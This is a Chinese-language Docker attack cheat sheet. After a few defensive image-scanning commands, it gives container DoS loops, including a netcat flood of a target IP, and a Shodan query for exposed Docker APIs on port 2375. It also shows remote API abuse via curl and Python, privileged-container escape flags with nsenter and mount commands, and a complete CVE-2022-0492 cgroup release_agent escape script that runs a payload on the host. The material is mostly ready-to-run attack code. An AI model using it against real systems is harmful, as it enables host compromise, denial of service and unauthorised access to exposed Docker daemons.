# Docker服务

1.镜像扫描

[Docker Scout](https://docs.docker.com/scout/)
```bash
git clone https://github.com/docker/scout-demo-service.git
cd scout-demo-service
docker login
docker build --push -t <ORG_NAME>/scout-demo:v1 .

docker scout enroll <ORG_NAME>
    Successfully enrolled organization <ORG_NAME> with Docker Scout Free
docker scout repo enable --org <ORG_NAME> <ORG_NAME>/scout-demo

docker scout cves --only-package express
```

Docker Scan
```Bash
docker scan hello-world

Testing hello-world...

Organization:      docker-desktop-test
Package manager:   linux
Project name:      docker-image|hello-world
Docker image:      hello-world
Licenses:          enabled

✓ Tested 0 dependencies for known issues, no vulnerable paths found.

Note that we do not currently have vulnerability data for your image.
```

[trivy](https://github.com/aquasecurity/trivy)
```Bash
trivy -q -f json <container_name>:<tag>
```

[snyk](https://docs.snyk.io/snyk-cli/getting-started-with-the-cli)
```Bash
snyk container test <image> --json-file-output=<output file> --severity-threshold=high
```

[clair-scanner](https://github.com/arminc/clair-scanner)
```Bash
clair-scanner -w example-alpine.yaml --ip YOUR_LOCAL_IP alpine:3.5
```

2.cgroups
```Bash
docker run -it -m 500M --kernel-memory 50M --cpu-shares 512 --blkio-weight 400 --name ubuntu1 ubuntu bash
```

获取容器的cgroup
```Bash
docker run -dt --rm [images-name] sleep 200
ps -ef | grep 200
ls -l /proc/<PID>/ns
```

3.容器DOS

CPU DOS
```Bash
# stress-ng
sudo apt-get install -y stress-ng && stress-ng --vm 1 --vm-bytes 1G --verify -t 5m

# While
docker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done'
```

网络DOS
```Bash
nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc <target IP> 4444; done
```

## 滥用API

Shodan：
```Bash
port:2375 product:"docker"
```

启用API
```Bash
/usr/lib/systemd/system/docker.service:
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock

systemctl daemon-reload
systemctl restart docker
```

```Bash
docker -H IP地址:端口 version  //查看Docker版本
docker -H IP地址:端口 images  //查看运行的镜像
docker -H IP地址:端口 exec -it 镜像ID /bin/bash  //远程访问容器

curl -X GET http://<远程主机IP>:2375/containers/json  //查看所有容器
curl -X GET http://<远程主机IP>:2375/images/json  //查看所有镜像
curl -X GET http://<远程主机IP>:2375/containers/<容器ID>/json  //查看特定容器的详细信息
curl -X GET http://<远程主机IP>:2375/images/<镜像ID>/json  //查看特定镜像的详细信息
```

使用Python脚本通过Docker API查看远程Docker靶机的容器和镜像信息
```python
import docker

client = docker.DockerClient(base_url='tcp://<远程主机IP>:2375')

# 查看所有容器
containers = client.containers.list(all=True)
for container in containers:
    print(container.id, container.name)

# 查看所有镜像
images = client.images.list()
for image in images:
    print(image.id, image.tags)
```

## 容器逃逸

### 特权容器逃逸

+ --cap-add=ALL
+ --security-opt apparmor=unconfined
+ --security-opt seccomp=unconfined
+ --security-opt label:disable
+ --pid=host
+ --userns=host
+ --uts=host
+ --cgroupns=host
+ mount /dev

1.hostpid

Docker启动选项
```bash
docker run --rm -u 0 -it --pid=host --privileged [镜像] /bin/bash
```

容器内执行
```Bash
nsenter --target 1 --mount --uts --ipc --net --pid – bash
```

2.挂载宿主机文件

Docker启动选项
```Bash
docker run --rm -u 0 -it --privileged [镜像] /bin/bash
docker run --rm -u 0 -it --device=/dev/sda1 [镜像] /bin/bash
```

容器内执行
```Bash
mkdir -p /mnt/docker
mount /dev/sda1 /mnt/docker
cd /mnd/docker
```

3.hostPath

容器内执行
```Bash
echo 1 > /proc/sysrq-trigger  //检查是否可写入
cat /proc/cmdline  //获取root UID
findfs UUID=UUID值  //查看文件系统
mkdir /mnt-docker
mount /dev/sda1 /mnt-docker
debugfs /dev/sda1
```

4.CVE-2022-0492

[UNIT42](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

[HTB](https://www.hackthebox.com/blog/cve-2022-04920-carpe-diem-explained)

枚举PID触发release_agent
```Bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=168607
CGROUP_NAME="x"
CGROUP_MOUNT="/docker"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# 运行一个长时间进程，以便搜索
sleep 10000 &

# 在宿主机上执行的有效负载
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

ps -eaf > \${OUTPATH} 2>&1  //在宿主机上运行的命令
__EOF__

chmod a+x ${PAYLOAD_PATH}

# cgroup挂载
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# 枚举宿主机PID
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # 将release_agent路径设置为枚举到的PID
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # 触发release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# 捕获输出
sleep 1
echo "Output:"
cat ${OUTPUT_PATH}
```

### Docker挂载
